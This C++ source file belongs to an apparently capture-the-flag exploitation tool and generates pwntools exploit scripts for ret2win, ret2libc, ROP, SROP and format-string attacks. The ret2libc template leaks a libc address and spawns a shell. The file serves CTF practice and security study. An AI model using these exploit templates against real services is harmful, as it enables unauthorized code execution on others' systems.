// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 manop55555

#include "abcpwn/commands/template_cmd.hpp"

#include "abcpwn/core/safe_io.hpp"

#include <CLI/CLI.hpp>

#include <sstream>
#include <string>
#include <string_view>

namespace abcpwn::commands::tmpl {

namespace {

void append_common_header(std::ostringstream& os, std::string_view binary_path) {
    os <<
        "#!/usr/bin/env python3\n"
        "from pwn import *\n"
        "\n"
        "context.binary = elf = ELF(" << '"' << binary_path << '"' << ")\n"
        "context.log_level = 'info'\n"
        "\n"
        "REMOTE = False\n"
        "HOST, PORT = 'localhost', 1337\n"
        "\n"
        "def start():\n"
        "    if REMOTE:\n"
        "        return remote(HOST, PORT)\n"
        "    return process([elf.path])\n"
        "\n"
        "io = start()\n"
        "\n";
}

}  // namespace

std::string render_template(std::string_view strategy, std::string_view binary_path) {
    std::ostringstream os;
    os << "# abcpwn template: strategy=" << strategy << "\n";
    append_common_header(os, binary_path);

    if (strategy == "ret2win") {
        os <<
            "# strategy: ret2win\n"
            "# replace WIN_SYM with the symbol that wins the challenge\n"
            "win = elf.symbols.get('WIN_SYM', 0xdeadbeef)\n"
            "\n"
            "# step 1: find the offset to saved RIP via abcpwn cyclic\n"
            "OFFSET = 40\n"
            "payload = cyclic(OFFSET) + p64(win)\n"
            "io.sendlineafter(b'> ', payload)\n"
            "io.interactive()\n";
    } else if (strategy == "ret2libc") {
        os <<
            "# strategy: ret2libc\n"
            "libc = elf.libc if elf.libc else ELF('./libc.so.6')\n"
            "\n"
            "OFFSET = 40                       # find with abcpwn cyclic --find\n"
            "POP_RDI = 0xdeadbeef              # find with abcpwn gadget --filter 'pop rdi ; ret'\n"
            "RET     = 0xcafebabe              # stack-align ret\n"
            "\n"
            "# step 1: leak a libc address (e.g., puts@got via puts@plt)\n"
            "payload  = cyclic(OFFSET)\n"
            "payload += p64(POP_RDI) + p64(elf.got['puts'])\n"
            "payload += p64(elf.plt['puts']) + p64(elf.symbols['main'])\n"
            "io.sendlineafter(b'> ', payload)\n"
            "leak = u64(io.recvline().strip().ljust(8, b'\\0'))\n"
            "libc.address = leak - libc.symbols['puts']\n"
            "log.info('libc base @ %#x', libc.address)\n"
            "\n"
            "# step 2: spawn shell\n"
            "bin_sh  = next(libc.search(b'/bin/sh'))\n"
            "system  = libc.symbols['system']\n"
            "payload  = cyclic(OFFSET)\n"
            "payload += p64(RET) + p64(POP_RDI) + p64(bin_sh) + p64(system)\n"
            "io.sendlineafter(b'> ', payload)\n"
            "io.interactive()\n";
    } else if (strategy == "rop") {
        os <<
            "# strategy: generic ROP chain\n"
            "rop = ROP(elf)\n"
            "rop.call('puts', [elf.got['puts']])\n"
            "rop.call(elf.symbols['main'])\n"
            "io.sendlineafter(b'> ', cyclic(40) + rop.chain())\n"
            "io.interactive()\n";
    } else if (strategy == "srop") {
        os <<
            "# strategy: SROP via abcpwn srop --syscall N --syscall-arg ARG\n"
            "# generate frame bytes with `abcpwn srop --syscall 59 --syscall-arg 0xADDR`\n"
            "FRAME_HEX = 'PASTE_HERE'\n"
            "io.sendlineafter(b'> ', cyclic(40) + bytes.fromhex(FRAME_HEX))\n"
            "io.interactive()\n";
    } else if (strategy == "fmt-leak") {
        os <<
            "# strategy: format-string leak\n"
            "OFFSET = 6                                  # find with abcpwn fmt --find-offset\n"
            "io.sendlineafter(b'> ', f'%{OFFSET}$s'.encode())\n"
            "leak = io.recvline().strip()\n"
            "log.info('leak: %r', leak)\n";
    } else if (strategy == "heap") {
        os <<
            "# strategy: heap (placeholder)\n"
            "# replace with the technique-specific primitive\n"
            "io.interactive()\n";
    } else {
        os <<
            "# strategy: " << strategy << " (no built-in template)\n"
            "io.interactive()\n";
    }
    return os.str();
}

void TemplateCommand::setup(CLI::App& app) {
    app.add_option("strategy", strategy,
        "ret2win | ret2libc | rop | srop | fmt-leak | heap")->required();
    app.add_option("binary", binary_path, "Challenge binary path")->required();
    app.add_option("-o,--output", output_path,
        "Write the rendered template to this path");
}

core::Result<core::CommandResult> TemplateCommand::run(const core::Context& /*ctx*/) {
    const auto rendered = render_template(strategy, binary_path);
    if (!output_path.empty()) {
        auto w = core::safe_io::write_text_file_atomic(output_path, rendered);
        if (!w) {
            return core::err(w.error());
        }
        core::CommandResult res;
        res.raw_lines.push_back("wrote " + std::to_string(rendered.size())
            + " bytes to " + output_path);
        return res;
    }
    core::CommandResult res;
    res.raw_lines.push_back(rendered);
    return res;
}

}  // namespace abcpwn::commands::tmpl
